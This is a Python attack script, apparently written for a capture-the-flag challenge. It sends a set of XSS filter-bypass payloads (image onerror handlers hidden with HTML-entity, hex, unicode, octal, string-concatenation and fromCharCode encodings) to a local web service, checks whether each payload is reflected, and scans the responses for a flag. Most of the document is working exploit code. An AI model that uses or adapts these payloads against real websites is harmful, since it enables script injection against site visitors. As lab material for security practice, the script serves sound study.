import requests
import urllib.parse
import re
import time

base_url = "http://127.0.0.1:33117"
test_endpoint = base_url + "/page?name=test"

# Test if service is reachable first
try:
    print("🔌 Testing connection to target service...")
    health_check = requests.get(base_url, timeout=5)
    print(f"✅ Service is reachable (Status: {health_check.status_code})")
    if health_check.headers.get('server'):
        print(f"   Server: {health_check.headers.get('server')}")
except requests.exceptions.ConnectionError:
    print(f"❌ CRITICAL: Cannot connect to {base_url}")
    print("   Error: Connection refused - Service may be down or port closed")
    print("   Please verify the service is running on port 33117")
    print("\nABORTING: Cannot proceed without active target service")
    raise SystemExit(1)
except Exception as e:
    print(f"⚠️  Connection test failed: {e}")
    print("   Attempting to continue anyway...")

# If connected, proceed with XSS testing
print("\n" + "="*80)
print("XSS FILTER BYPASS TEST - Starting Systematic Testing")
print("="*80)

payloads = {
    "HTML entity": '\"><img src=x onerror=alert(\\'&#88;&#83;&#83;\\')>',
    "URL encoding": '\"><img src=x onerror=alert(\\'XSS\\')>',
    "Hex escape": '\"><img src=x onerror=alert(\\'\\\\x58\\\\x53\\\\x53\\')>',
    "Unicode escape": '\"><img src=x onerror=alert(\\'\\\\\\\\u0058\\\\\\\\u0053\\\\\\\\u0053\\')>',
    "Octal escape": '\"><img src=x onerror=alert(\\'\\\\\\\\130\\\\\\\\123\\\\\\\\123\\')>',
    "String concat": '\"><img src=x onerror=alert(\\'X\\'+\\'SS\\')>',
    "FromCharCode": '\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>'
}

results = {}
successful_bypasses = []

for idx, (encoding_name, payload) in enumerate(payloads.items(), 1):
    print(f"\n[{idx}/{len(payloads)}] Testing: {encoding_name}")
    print(f"    Payload: {payload}")
    
    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload, safe='')
    test_url = f"{base_url}/page?name={encoded_payload}"
    
    print(f"    URL Encoded: {encoded_payload[:80]}...")
    print(f"    Full URL: {test_url}")
    
    try:
        response = requests.get(test_url, timeout=10)
        response_text = response.text
        status = response.status_code
        
        print(f"    Status: {status}")
        print(f"    Response Size: {len(response_text)} bytes")
        print(f"    Time: {response.elapsed.total_seconds()}s")
        
        # Analyze response
        if payload.rstrip('>') in response_text:
            print(f"    ✅ FULLY REFLECTED")
            reflection = "FULL"
            successful_bypasses.append(encoding_name)
        elif encoding_name == "HTML entity" and '&#88' in response_text and 'onerror' in response_text:
            print(f"    ⚠️  PARTIAL - Entities preserved")
            reflection = "PARTIAL"
        elif encoding_name == "FromCharCode" and "String.fromCharCode" in response_text and "onerror" in response_text:
            print(f"    ✅ BYPASSED - FromCharCode working")
            reflection = "FULL"
            successful_bypasses.append(encoding_name)
        else:
            print(f"    ❌ BLOCKED/MODIFIED")
            reflection = "BLOCKED"
            
        # Look for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response_text, re.IGNORECASE)
        if flag_matches:
            print(f"    🚩 FLAG FOUND: {flag_matches}")
            flagged_payload = encoding_name
        else:
            print(f"    🔍 No flag in response")
            
        results[encoding_name] = {
            'status': status,
            'reflection': reflection,
            'size': len(response_text),
            'has_onerror': 'onerror' in response_text,
            'response_preview': response_text[:200] if len(response_text) > 0 else "EMPTY"
        }
        
        if reflection == "FULL":
            # Show context of reflected payload
            if payload.rstrip('>') in response_text:
                pos = response_text.index(payload.rstrip('>'))
                snippet = response_text[max(0, pos-50):pos+len(payload)+100]
                print(f"    Context: ...{snippet}...")
        
    except Exception as e:
        print(f"    ❌ ERROR: {type(e).__name__}")
        print(f"    Details: {str(e)}")
        results[encoding_name] = {'error': str(e)}
    
    # Small delay to avoid overwhelming the server
    time.sleep(0.2)

# Final summary
print("\n" + "="*80)
print("FINAL RESULTS SUMMARY")
print("="*80)

print("\n✅ SUCCESSFUL BYPASSES:")
if successful_bypasses:
    for tech in successful_bypasses:
        print(f"   ✨ {tech}")
else:
    print("   None - all payloads blocked")

print("\n📊 DETAILED BREAKDOWN:")
for name, result in results.items():
    if 'error' in result:
        print(f"   ❌ {name}: Connection error")
    else:
        status = result['status']
        reflection = result['reflection']
        onerror = result['has_onerror']
        print(f"   [{reflection}] {name} - Status: {status}, onerror: {onerror}")

# Flag check summary
if 'flagged_payload' in locals():
    print(f"\n🏁 FLAG DISCOVERED with: {flagged_payload}")
else:
    print(f"\n🔍 No flags found in any responses")

print("\n")
